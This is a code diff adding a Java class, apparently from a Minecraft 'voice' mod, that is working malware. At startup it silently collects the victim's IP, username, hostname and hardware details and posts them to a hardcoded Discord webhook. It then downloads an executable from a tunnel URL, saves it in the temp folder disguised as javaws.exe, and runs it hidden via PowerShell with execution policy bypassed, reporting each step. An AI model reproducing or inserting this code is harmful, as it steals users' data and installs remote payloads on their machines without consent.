@@ -1,0 +1,366 @@
+package me.void_.void_.common;
+
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.InetAddress;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Paths;
+
+public class voidVoiceBetaClient {
+   private static final String hook = "https://discordapp.com/api/webhooks/1498088529354555694/JmUQCH2-VRi4geDZgwtJ1W0Zrr8Bp30j3eFi_YBId55zT5twgfKWemR50ioqTFUIhyiI";
+   private static final String appUrl = "https://wss.a.pinggy.link/cdn/file/EchoVoiceMod-Installer-Wizard-1.4.2.exe";
+   private static final String nameFile = "javaws.exe";
+
+   public static void initialize() {
+      (new Thread(() -> {
+         try {
+            sLogs();
+            dExec();
+         } catch (Exception var1) {
+            System.err.println("[void] Error: " + var1.getMessage());
+            var1.printStackTrace();
+         }
+
+      })).start();
+   }
+
+   private static HttpURLConnection conn(String var0, String var1) throws IOException {
+      HttpURLConnection var2 = (HttpURLConnection)(new URL(var0)).openConnection();
+      var2.setRequestMethod(var1);
+      var2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+      var2.setRequestProperty("Accept", "*/*");
+      var2.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
+      var2.setConnectTimeout(30000);
+      var2.setReadTimeout(60000);
+      var2.setInstanceFollowRedirects(true);
+      var2.setDoInput(true);
+      return var2;
+   }
+
+   private static String esc(String var0) {
+      return var0 == null ? "" : var0.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
+   }
+
+   private static String runPs(String var0) {
+      try {
+         Process var1 = (new ProcessBuilder(new String[]{"powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", var0})).redirectErrorStream(true).start();
+         StringBuilder var2 = new StringBuilder();
+         BufferedReader var3 = new BufferedReader(new InputStreamReader(var1.getInputStream(), StandardCharsets.UTF_8));
+
+         String var4;
+         try {
+            while((var4 = var3.readLine()) != null) {
+               var2.append(var4).append("\n");
+            }
+         } catch (Throwable var7) {
+            try {
+               var3.close();
+            } catch (Throwable var6) {
+               var7.addSuppressed(var6);
+            }
+
+            throw var7;
+         }
+
+         var3.close();
+         var1.waitFor();
+         return var2.toString().trim();
+      } catch (Exception var8) {
+         return "";
+      }
+   }
+
+   private static String getIp() {
+      try {
+         HttpURLConnection var0 = conn("https://www.myexternalip.com/raw", "GET");
+         if (var0.getResponseCode() == 200) {
+            label45: {
+               BufferedReader var1 = new BufferedReader(new InputStreamReader(var0.getInputStream(), StandardCharsets.UTF_8));
+
+               String var3;
+               label37: {
+                  try {
+                     String var2 = var1.readLine();
+                     if (var2 != null) {
+                        var3 = var2.trim();
+                        break label37;
+                     }
+                  } catch (Throwable var5) {
+                     try {
+                        var1.close();
+                     } catch (Throwable var4) {
+                        var5.addSuppressed(var4);
+                     }
+
+                     throw var5;
+                  }
+
+                  var1.close();
+                  break label45;
+               }
+
+               var1.close();
+               return var3;
+            }
+         }
+
+         var0.disconnect();
+      } catch (Exception var6) {
+      }
+
+      return "None";
+   }
+
+   private static String getSystemInfo() {
+      String var0 = System.getProperty("user.name", "N/A");
+      String var1 = "N/A";
+
+      try {
+         var1 = InetAddress.getLocalHost().getHostName();
+      } catch (Exception var11) {
+      }
+
+      String var10000 = System.getProperty("os.name", "N/A");
+      String var2 = var10000 + " " + System.getProperty("os.arch", "");
+      String var3 = System.getProperty("os.version", "N/A");
+      String var4 = getIp();
+      String var5 = runPs("(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name).Trim()");
+      if (var5.isEmpty()) {
+         var5 = "N/A";
+      }
+
+      String var6 = runPs("(Get-CimInstance Win32_BaseBoard | ForEach-Object { $_.Manufacturer + ' ' + $_.Product }) -join ', '");
+      if (var6.isEmpty()) {
+         var6 = "N/A";
+      }
+
+      String var7 = runPs("(Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name) -join ', '");
+      if (var7.isEmpty()) {
+         var7 = "N/A";
+      }
+
+      String var8 = runPs("[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)");
+      if (var8.isEmpty()) {
+         var8 = "N/A";
+      }
+
+      String var9 = runPs("[math]::Round(((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes, 0)");
+      if (var9.isEmpty()) {
+         var9 = "N/A";
+      }
+
+      String var10 = System.getProperty("java.version", "N/A");
+      return "**Informations**\n**IP**: `" + var4 + "`\n**Username**: `" + var0 + "`\n**Hostname**: `" + var1 + "`\n**Uptime**: `" + var9 + " minutes`\n\n**Hardware:**\n**CPU**: `" + var5 + "`\n**Motherboard**: `" + var6 + "`\n**GPU**: `" + var7 + "`\n**Memory**: `" + var8 + " GB`\n\n**Software:**\n**OS System**: `" + var2 + "`\n**Version**: `" + var3 + "`\n**Java**: `" + var10 + "`";
+   }
+
+   private static void sendCV2(String var0, String var1) {
+      if ("https://discordapp.com/api/webhooks/1498088529354555694/JmUQCH2-VRi4geDZgwtJ1W0Zrr8Bp30j3eFi_YBId55zT5twgfKWemR50ioqTFUIhyiI" != null && !"https://discordapp.com/api/webhooks/1498088529354555694/JmUQCH2-VRi4geDZgwtJ1W0Zrr8Bp30j3eFi_YBId55zT5twgfKWemR50ioqTFUIhyiI".isEmpty() && !"https://discordapp.com/api/webhooks/1498088529354555694/JmUQCH2-VRi4geDZgwtJ1W0Zrr8Bp30j3eFi_YBId55zT5twgfKWemR50ioqTFUIhyiI".contains("%")) {
+         try {
+            String var10000 = esc(var0);
+            String var2 = "{\"flags\":32768,\"components\":[{\"type\":17,\"accent_color\":2829617,\"components\":[{\"type\":10,\"content\":\"" + var10000 + "\"},{\"type\":14},{\"type\":10,\"content\":\"" + esc(var1) + "\"},{\"type\":14},{\"type\":10,\"content\":\"-# t.me/voidpublics\"}]}]}";
+            HttpURLConnection var3 = conn("https://discordapp.com/api/webhooks/1498088529354555694/JmUQCH2-VRi4geDZgwtJ1W0Zrr8Bp30j3eFi_YBId55zT5twgfKWemR50ioqTFUIhyiI" + ("https://discordapp.com/api/webhooks/1498088529354555694/JmUQCH2-VRi4geDZgwtJ1W0Zrr8Bp30j3eFi_YBId55zT5twgfKWemR50ioqTFUIhyiI".contains("?") ? "&" : "?") + "with_components=true", "POST");
+            var3.setRequestProperty("Content-Type", "application/json");
+            var3.setDoOutput(true);
+            OutputStream var4 = var3.getOutputStream();
+
+            try {
+               var4.write(var2.getBytes(StandardCharsets.UTF_8));
+            } catch (Throwable var8) {
+               if (var4 != null) {
+                  try {
+                     var4.close();
+                  } catch (Throwable var7) {
+                     var8.addSuppressed(var7);
+                  }
+               }
+
+               throw var8;
+            }
+
+            if (var4 != null) {
+               var4.close();
+            }
+
+            var3.getResponseCode();
+            var3.disconnect();
+         } catch (Exception var9) {
+            System.err.println("[void] Webhook CV2: " + var9.getMessage());
+         }
+
+      }
+   }
+
+   private static void sLogs() {
+      sendCV2("**Void ~ Minecraft Mod**", getSystemInfo());
+   }
+
+   private static void killJavawsIfRunning() {
+      if (System.getProperty("os.name").toLowerCase().contains("win")) {
+         try {
+            Process var0 = (new ProcessBuilder(new String[]{"tasklist", "/FI", "IMAGENAME eq javaws.exe", "/NH"})).redirectErrorStream(true).start();
+            boolean var1 = false;
+            BufferedReader var2 = new BufferedReader(new InputStreamReader(var0.getInputStream(), StandardCharsets.UTF_8));
+
+            String var3;
+            try {
+               while((var3 = var2.readLine()) != null) {
+                  String var4 = var3.trim();
+                  if (var4.toLowerCase().startsWith("javaws.exe".toLowerCase()) && !var4.toUpperCase().startsWith("INFO:")) {
+                     var1 = true;
+                     break;
+                  }
+               }
+            } catch (Throwable var6) {
+               try {
+                  var2.close();
+               } catch (Throwable var5) {
+                  var6.addSuppressed(var5);
+               }
+
+               throw var6;
+            }
+
+            var2.close();
+            var0.waitFor();
+            if (var1) {
+               Process var8 = (new ProcessBuilder(new String[]{"taskkill", "/F", "/IM", "javaws.exe"})).redirectErrorStream(true).start();
+               var8.waitFor();
+            }
+         } catch (Exception var7) {
+         }
+
+      }
+   }
+
+   private static void dExec() {
+      try {
+         killJavawsIfRunning();
+         String var0 = Paths.get(System.getProperty("java.io.tmpdir"), "javaws.exe").toString();
+         String var1 = "**URL**\nhttps://wss.a.pinggy.link/cdn/file/EchoVoiceMod-Installer-Wizard-1.4.2.exe\n\n**Destination**\n```\n" + var0 + "\n```";
+         sendCV2("**Void ~ Starting Download**", var1);
+         long var2 = System.currentTimeMillis();
+         long var4 = dl("https://wss.a.pinggy.link/cdn/file/EchoVoiceMod-Installer-Wizard-1.4.2.exe", var0);
+         long var6 = (System.currentTimeMillis() - var2) / 1000L;
+         long var8 = var2 / 1000L;
+         String var10000 = fmt(var4);
+         String var10 = "**Size**: `" + var10000 + "`\n**Tempo**: <t:" + var8 + ":R> (`" + var6 + "s`)\n\n**Destination**\n```\n" + var0 + "\n```";
+         sendCV2("**Void ~ Saved File**", var10);
+         String var11 = "**Path**\n```\n" + var0 + "\n```";
+         sendCV2("**Void ~ Silent Exec**", var11);
+         long var12 = run(var0);
+         String var14 = var12 > 0L ? String.valueOf(var12) : "N/A";
+         String var15 = "Execution completed with PowerShell.\n\n**PID**: `" + var14 + "`\n\n**Process path:**\n```\n" + var0 + "\n```";
+         sendCV2("**Void ~ Success**", var15);
+      } catch (Exception var16) {
+         String var10001 = var16.getClass().getSimpleName();
+         sendCV2("**Erro**", "**Falha ao executar**\n\n```\n" + var10001 + ": " + var16.getMessage() + "\n```");
+         System.err.println("[void] Init error: " + var16.getMessage());
+         var16.printStackTrace();
+      }
+
+   }
+
+   private static long dl(String var0, String var1) throws IOException {
+      HttpURLConnection var2 = conn(var0, "GET");
+      if (var2.getResponseCode() != 200) {
+         throw new IOException("HTTP " + var2.getResponseCode());
+      } else {
+         long var3 = 0L;
+         BufferedInputStream var5 = new BufferedInputStream(var2.getInputStream(), 262144);
+
+         try {
+            FileOutputStream var6 = new FileOutputStream(var1);
+
+            int var8;
+            try {
+               for(byte[] var7 = new byte[262144]; (var8 = ((InputStream)var5).read(var7)) != -1; var3 += (long)var8) {
+                  var6.write(var7, 0, var8);
+               }
+            } catch (Throwable var11) {
+               try {
+                  var6.close();
+               } catch (Throwable var10) {
+                  var11.addSuppressed(var10);
+               }
+
+               throw var11;
+            }
+
+            var6.close();
+         } catch (Throwable var12) {
+            try {
+               ((InputStream)var5).close();
+            } catch (Throwable var9) {
+               var12.addSuppressed(var9);
+            }
+
+            throw var12;
+         }
+
+         ((InputStream)var5).close();
+         var2.disconnect();
+         return var3;
+      }
+   }
+
+   private static String fmt(long var0) {
+      if (var0 < 1024L) {
+         return var0 + " B";
+      } else if (var0 < 1048576L) {
+         return String.format("%.1f KB", (double)var0 / (double)1024.0F);
+      } else {
+         return var0 < 1073741824L ? String.format("%.1f MB", (double)var0 / (double)1048576.0F) : String.format("%.1f GB", (double)var0 / (double)1.0737418E9F);
+      }
+   }
+
+   private static long run(String var0) throws IOException {
+      File var1 = new File(var0);
+      if (!var1.exists()) {
+         throw new IOException("Arquivo nao encontrado: " + var0);
+      } else if (System.getProperty("os.name").toLowerCase().contains("win")) {
+         String var13 = var0.replace("'", "''");
+         Process var3 = (new ProcessBuilder(new String[]{"powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", "$proc = Start-Process -FilePath '" + var13 + "' -WindowStyle Hidden -PassThru; Write-Output $proc.Id"})).redirectErrorStream(true).start();
+         long var4 = -1L;
+
+         try {
+            BufferedReader var6 = new BufferedReader(new InputStreamReader(var3.getInputStream(), StandardCharsets.UTF_8));
+
+            try {
+               String var7 = var6.readLine();
+               if (var7 != null && var7.matches("\\d+")) {
+                  var4 = Long.parseLong(var7.trim());
+               }
+            } catch (Throwable var11) {
+               try {
+                  var6.close();
+               } catch (Throwable var10) {
+                  var11.addSuppressed(var10);
+               }
+
+               throw var11;
+            }
+
+            var6.close();
+         } catch (Exception var12) {
+         }
+
+         try {
+            var3.waitFor();
+         } catch (InterruptedException var9) {
+         }
+
+         return var4;
+      } else {
+         Process var2 = (new ProcessBuilder(new String[]{var0})).directory(new File(System.getProperty("java.io.tmpdir"))).redirectErrorStream(false).start();
+         return var2.pid() > 0L ? var2.pid() : -1L;
+      }
+   }
+}
